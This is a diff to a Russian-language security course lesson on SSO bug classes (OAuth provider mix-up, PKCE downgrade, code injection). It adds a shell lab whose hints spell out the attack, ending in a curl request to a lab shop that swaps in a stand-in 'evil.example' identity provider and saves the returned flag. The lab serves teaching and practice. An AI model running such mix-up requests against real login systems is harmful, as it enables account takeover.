@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 45
 summary: "Классы SSO-багов за пределами redirect_uri: mix-up между IdP, downgrade PKCE, code injection, token leakage."
+lab:
+  kind: shell
+  title: 'Практика: OAuth mix-up (путаница провайдеров)'
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Приложение умеет входить через двух провайдеров: `acmeid.example` и `corp.example`.'
+    - 'На callback оно доверяет параметру `idp` из ЗАПРОСА, а не значению, сохранённому в сессии.'
+    - 'Подставь своего провайдера: `.../cb?code=CODE_FROM_CORP&idp=evil.example`.'
+    - '`curl -s ''https://shop.local/cb?code=CODE_FROM_CORP&idp=evil.example'' | tail -1 > found.txt`, затем `check`.'
 ---
 
 В прошлом уроке мы ломали один провайдер. Но крупные приложения часто доверяют **нескольким** провайдерам сразу: «Войти через Google», «Войти через корпоративный SSO», «Войти через GitHub». Когда провайдеров несколько, появляется новый класс атак — путаница между ними (**mix-up**). Разберём его, а также смежные — downgrade PKCE и инъекцию кода.
